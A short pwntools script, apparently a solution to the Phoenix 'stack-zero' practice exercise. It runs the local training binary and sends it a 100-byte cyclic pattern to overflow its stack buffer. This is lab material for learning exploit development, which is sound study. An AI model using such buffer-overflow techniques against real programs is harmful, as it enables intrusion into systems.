#!/usr/bin/env python3
from pwn import *

io = process("/opt/phoenix/amd64/stack-zero")
print(io.recvline().decode("ascii"))
io.sendline(cyclic(100))
print(io.recvline().decode("ascii"))
